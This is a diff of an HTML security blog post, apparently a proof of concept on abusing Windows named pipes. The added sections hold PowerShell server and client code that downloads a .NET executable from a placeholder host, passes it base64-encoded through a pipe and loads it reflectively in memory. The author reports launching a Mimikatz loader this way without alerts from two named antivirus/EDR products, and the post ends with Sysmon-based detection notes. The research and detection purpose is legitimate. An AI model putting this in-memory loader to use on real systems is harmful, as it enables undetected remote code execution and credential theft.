@@ -141,14 +141,14 @@
                                     Invoke-Expression -Command $auth
                                 </div>
 
-                                With powershell, the cmdlet <strong>Invoke-expression</strong> runs a command on the local machine
+                                The cmdlet <strong>Invoke-expression</strong> runs the specified command on the local machine which will authenticate itself to the server.
                             </p>
 
                             <h4 class="mb-0">Command execution</h4>
                             <p>
-                                On the previous section, we've seen that it is possible to send message from the server to client and execute a net use command to authenticate to another system through network. So with the named pipe functionnalities, the server can send command to the client and the client immediately execute it.
+                                On the previous section, we've seen that it is possible to send message from the server to client and execute <strong>net use</strong> command to authenticate to another system through network. So with the named pipe functionnalities, the server can send commands to the client and execute it.
 
-                                <img src="img/namedpipe/sending_message.jpg" class="img-fluid" width="500">
+                                <img src="img/namedpipe/sending_message.jpg" class="img-fluid" width="700">
 
                                 The method WriteLine() and ReadLine() of the class StreamWriter and StreamReader will send and receive the message through the pipe. <br>
                                 <br>
@@ -186,8 +186,102 @@
                                 Example : <strong>Running IPCONFIG</strong>
                                 <img src="img/namedpipe/command_exe.jpg" class="img-fluid" width="700">
                                 In this example, we ran "ipconfig" to get the ip address information, but this also means "data exfiltration", we could have navigated through different path "C:\Users\[Username]\Documents" or check mapped drives with "<strong>net use</strong>" or check local account "<strong>net user</strong>"...
+                            </p>
+                            
+                            <h4 class="mb-0">Remote Code Execution</h4>
+                            <p>
+                                This is probably the most interesting part. Executing code in another computer from our own system. Cobalt Strike uses Windows pipes to communicate between systems in the network. For example, the "keylogger" module is able to send the pressed keys back to the main beacon process. The keylogger module is fully fileless, which makes the detection harder for antiviruses and EDR. The pipes help that communication between the server and the clients without writing on the disk. We will simulate how to load and execute the process in memory to bypass the detection from the antivirus and EDR.
 
+                                In PowerShell, it is possible to run a .NET application executable with the Assembly class from the System.Reflection namespace. .NET application can be application written in C#. To illustrate it, we will start with a simple C# program that will print "Hello World". <br>
+                                <br>
 
+                               <i><u>Content of the file "Program.cs"</u></i> 
+                                <div class="squarebox">
+                                    using System; <br>
+                                    <br>
+                                    namespace Malcode <br>
+                                    { <br>
+                                    &emsp;class Program <br>
+                                    &emsp;{ <br>
+                                    &emsp;&emsp;static void Main() <br>
+                                    &emsp;&emsp;{ <br>
+                                    &emsp;&emsp;&emsp;Console.WriteLine("Hello World!"); <br>
+                                    &emsp;&emsp;} <br>
+                                    &emsp;} <br>
+                                    }<br>
+                                </div>
+
+                                Compile the .cs file with <strong>csc.exe</strong> to create a assembly file. <br>
+                                Then use the <strong>Load()</strong> method from the Assembly class to load the assembly in memory, find the entry point that is located with the main function and run the program with the method <strong>Invoke()</strong>
+
+                                <div class="squarebox">
+                                    $assemblyPath = 'D:\Programming\C#\YahudScript\Malcode\Malcode.exe' <br>
+                                    $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath) <br>
+                                    $assembly = [System.Reflection.Assembly]::Load($assemblyByte) <br>
+                                    $entryPoint = $assembly.EntryPoint <br>
+                                    $entryPoint.Invoke($null, $null) <br>
+                                </div>
+
+                                This code is showing you how to run a .NET application in PowerShell. To adapt this for the pipes, the server has to send the assembly bytes through the pipe, and the client loads the assembly bytes. The server can download the content of an .NET application using (New-Object Net.WebClient).DownloadString(URL) to download the content of an executable file and store it in a variable. Then send the variable through the pipe and the client loads and executes it. <br> <strong>=> Remote Code Execution</strong>
+
+                                <img src="img/namedpipe/helloworld.jpg" class="img-fluid" width="700">
+
+                                Now that we demonstrate how to remotely execute a .NET application from PowerShell, let's make some test to see if we can bypass some defenses. <br>
+                                <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PELoaderofMimikatz.cs">PELoaderofMimikatz.cs</a> from S3cur3Th1sSh1t is a version of Mimikatz for .NET application. <br>
+                                <br>
+                                If the assembly is found on disk, it will be immediately detected by the antivirus, the test has been done with Symantec EndPoint Protection.
+
+                                <img src="img/namedpipe/mimikatz_disk.jpg" class="img-fluid" width="600">
+
+                                But what happened if we load it in memory ? Will the antivirus be able to detect it ? <br>
+
+                                <i style="color: red;">Server code :</i>
+                                <div class="squarebox">
+                                    $assemblyFile = (New-Object Net.WebClient).DownloadString("https://X.X.X.X/YahudScript.exe") <br>
+                                    $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyFile) <br>
+                                    $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte) <br>
+                                    $sw.WriteLine($assemblyB64) # Server sending to the client <br>
+                                </div>
+
+                                <i style="color: yellow;">Client code :</i>
+                                <div class="squarebox">
+                                    $assemblyB64 = $sr.ReadLine() <br>
+                                    $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)<br>
+                                    $assembly = [System.Reflection.Assembly]::Load($assemblyByte)<br>
+                                    $assembly.EntryPoint.Invoke($null, $null)<br>           
+                                </div>
+
+                                Nothing has been written on disk, everything is happening through memory, we store the bytes in the variable and execute the content of that variable to launch .NET application.
+
+                                <img src="img/namedpipe/mimikatz_memory.jpg" class="img-fluid" width="500">
+
+                                <strong>Remote Code Execution</strong>. Mimikatz has been launched, no alert from <strong>Symantec EndPoint Protection</strong> and <strong>FireEye HX</strong>. The server can launch Mimikatz to any client that is connected to the pipes.
+
+                                Without any privilege escalation, we cannot do a LSASS dump, but it is mainly to demonstrate that loading executable in memory is still a huge weakness of antiviruses and EDR. 
+                            </p>
+
+                            <h4 class="mb-0">Detection</h4>
+                            <p>
+                                <strong>This section is mainly for FireEye for them to improve the detection</strong> <br>
+                                <br>
+                                As mentionned previously, the detection has not been great for the antivirus and EDR. We have created a named pipe under the name "YahudPipe" and no event has been recorded in the triage of the system from FireEye HX.
+
+                                <img src="img/namedpipe/fireeye_detection.jpg" class="img-fluid" width="800">
+
+                                To detect creation of a named pipe and connection to a named pipe, Sysmon is a tool that is available to monitor it. By filtering the Sysmon log in the event viewer with the ID 17, 18, we might monitor those events. <br>
+                                <ul>
+                                    <li>Sysmon event id 17 : Pipe creation</li>
+                                    <li>Sysmon event id 18 : Pipe connection</li>
+                                </ul>
+
+                                <img src="img/namedpipe/sysmon.jpg" class="img-fluid" width="600">
+
+                                The detection has been partially successful. Using accesschk, the connect pipe event has been recorded however the connection of my pipe has not been recorded by the event ID 18. The creation of the pipe "YahudPipe" has been fully recorded.
+                            </p>
+
+                            <h4 class="mb-0">Conclusion</h4>
+                            <p>
+                                Named pipes is a windows functionality that exist for a very long time, it is mainly used to send data from a process to another process. Most of people know the pipe to send the output of a command to the input of another command, such as dir | findstr "cmd.exe", which will send the output of the command "dir" as the input of the command "findstr". On the attack side, it is currently used by Cobalt Strike to exfiltrate data but on the defense side, we are still lacking of detection regarding this windows feature. As shown in this POC, the antivirus and EDR does not detect anything regarding the creation or the connection event of a pipe. Moreover, it give the opportunity for attackers to remotely execute code in memory which is another way to evade antivirus and EDR detection.
                             </p>
 
                     </div>
